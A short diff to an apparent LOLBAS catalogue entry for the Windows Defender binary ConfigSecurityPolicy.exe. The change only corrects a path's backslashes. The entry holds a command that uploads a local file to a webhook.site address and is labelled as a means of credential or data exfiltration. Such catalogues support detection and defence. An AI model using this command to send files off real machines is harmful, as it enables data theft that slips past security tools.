@@ -4,7 +4,7 @@ Description: Binary part of Windows Defender. Used to manage settings in Windows
 Author: Ialle Teixeira
 Created: 2020-09-04
 Commands:
-  - Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
+  - Command: ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
     Description: Upload file, credentials or data exfiltration in general
     Usecase: Upload file
     Category: Upload
